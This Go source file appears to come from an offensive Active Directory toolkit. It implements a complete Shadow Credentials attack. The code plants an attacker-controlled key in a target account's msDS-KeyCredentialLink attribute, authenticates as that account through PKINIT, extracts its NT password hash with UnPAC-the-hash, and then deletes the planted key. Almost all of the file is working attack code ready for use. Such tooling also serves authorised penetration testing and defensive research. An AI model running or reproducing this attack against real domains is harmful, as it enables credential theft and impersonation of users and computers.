package acl

import (
	"encoding/hex"
	"fmt"
	"strings"

	mtkrb "github.com/TheManticoreProject/Manticore/network/kerberos/v5"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/pkinit"
	manticoreldap "github.com/TheManticoreProject/Manticore/network/ldap"
	"github.com/TheManticoreProject/Manticore/windows/cng/bcrypt/keys"
	kcl "github.com/TheManticoreProject/Manticore/windows/keycredentiallink"

	"github.com/0xbbuddha/GoFenrir/protocols/ldap"
)

// ShadowCredResult is the outcome of a Shadow Credentials attack against one target.
type ShadowCredResult struct {
	SAMAccountName string
	DN             string
	NTHash         string // recovered via PKINIT + UnPAC-the-hash
}

// AddShadowCred runs the full Shadow Credentials attack against target: it writes a
// self-signed certificate's public key to the target's msDS-KeyCredentialLink
// (requires write access to that attribute - GenericWrite/GenericAll), authenticates
// as the target with certificate-based PKINIT to obtain a TGT, recovers the NT hash
// with UnPAC-the-hash, then removes the key credential it added.
//
// target is a sAMAccountName (a trailing "$" is added automatically for computers if
// the bare name does not resolve). realm is the Kerberos realm (DNS domain) and
// kdcHost is a domain controller.
func AddShadowCred(s *ldap.Session, target, realm, kdcHost string) (*ShadowCredResult, error) {
	dn, sam, err := resolvePrincipal(s, target)
	if err != nil {
		return nil, err
	}

	// Snapshot existing key credentials so we can remove only the one we add.
	original := map[string]bool{}
	if existing, err := manticoreldap.GetKeyCredentialLinks(s.LdapSession, dn); err == nil {
		for _, v := range existing {
			var dnb manticoreldap.DNWithBinary
			if _, err := dnb.Unmarshal([]byte(v)); err == nil {
				original[hex.EncodeToString(dnb.BinaryData)] = true
			}
		}
	}

	// Self-signed cert -> CNG RSA public-key blob -> msDS-KeyCredentialLink value.
	priv, certDER, err := pkinit.GenerateSelfSignedCert(2048, "gofenrir-shadowcred")
	if err != nil {
		return nil, fmt.Errorf("generate certificate: %w", err)
	}
	keyMaterial, err := keys.NewBCRYPT_RSA_PUBLIC_KEY(&priv.PublicKey).Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal public key: %w", err)
	}
	dnb, err := kcl.ComposeKeyCredentialLinkForComputer(dn, keyMaterial)
	if err != nil {
		return nil, fmt.Errorf("compose KeyCredentialLink: %w", err)
	}
	if err := manticoreldap.AddKeyCredentialLinkDNBinary(s.LdapSession, dn, dnb); err != nil {
		return nil, fmt.Errorf("write msDS-KeyCredentialLink (need GenericWrite over %s): %w", sam, err)
	}

	// Always try to remove the key we added, even if the PKINIT stage fails.
	defer func() {
		_ = manticoreldap.RemoveKeyCredentialLink(s.LdapSession, dn, func(blob []byte) bool {
			return original[hex.EncodeToString(blob)] // keep only pre-existing keys
		})
	}()

	client := mtkrb.NewClient(sam, strings.ToUpper(realm), kdcHost).
		WithPKINIT(priv, certDER).
		InsecureSkipPKINITKDCSignatureCheck()
	if err := client.GetTGT(); err != nil {
		return nil, fmt.Errorf("PKINIT GetTGT: %w", err)
	}
	defer client.Destroy()

	_, ntHash, err := client.UnPACTheHash()
	if err != nil {
		return nil, fmt.Errorf("UnPAC-the-hash: %w", err)
	}

	return &ShadowCredResult{
		SAMAccountName: sam,
		DN:             dn,
		NTHash:         hex.EncodeToString(ntHash),
	}, nil
}

// resolvePrincipal resolves a sAMAccountName (user or computer) to its DN and the
// exact sAMAccountName stored in the directory. A bare computer name is retried with
// a trailing "$".
func resolvePrincipal(s *ldap.Session, target string) (dn, sam string, err error) {
	for _, name := range []string{target, target + "$"} {
		filter := fmt.Sprintf("(sAMAccountName=%s)", name)
		entries, err := s.LdapSession.QueryWholeSubtree("", filter,
			[]string{"distinguishedName", "sAMAccountName"})
		if err != nil {
			return "", "", fmt.Errorf("resolve %q: %w", target, err)
		}
		if len(entries) > 0 {
			return entries[0].GetAttributeValue("distinguishedName"),
				entries[0].GetAttributeValue("sAMAccountName"), nil
		}
		if strings.HasSuffix(target, "$") {
			break // already a computer name, don't retry
		}
	}
	return "", "", fmt.Errorf("principal %q not found", target)
}
